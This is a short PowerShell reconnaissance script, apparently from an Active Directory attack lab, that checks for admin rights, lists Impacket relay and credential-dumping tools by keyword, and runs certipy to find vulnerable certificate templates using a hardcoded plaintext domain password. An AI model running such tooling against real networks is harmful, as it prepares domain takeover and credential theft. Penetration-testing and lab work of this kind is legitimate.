# ESC8 tooling + admin check on ws01
$ErrorActionPreference = "Continue"
Write-Output "=== current user / admin ==="
whoami
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Output "=== impacket tools available ==="
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
Get-ChildItem "$py\*.py" -Name | Where-Object { $_ -match "petitpotam|printer|coerce|ntlmrelay|dementor|machineaccount|addcomputer|rbcd|smbclient|wmiexec|secretsdump|lookupsid|GetUserSPNs|psexec" } | Sort-Object
Write-Output "=== coercer / ntlmrelayx on other paths ==="
Get-ChildItem C:\Tools -Recurse -Include "*coercer*","*petitpotam*","*printerbug*","*ntlmrelayx*" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
Write-Output "=== template ACL check via certipy find (ESC1 machine enroll) ==="
cd C:\Tools\cadre-attack
$py2 = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
& python "$py2\certipy.exe" find -u chief_command@cadre.local -p "C0mm@nd_Ch1ef!" -dc-ip 192.168.77.10 -vulnerable 2>&1 | Select-Object -Last 30
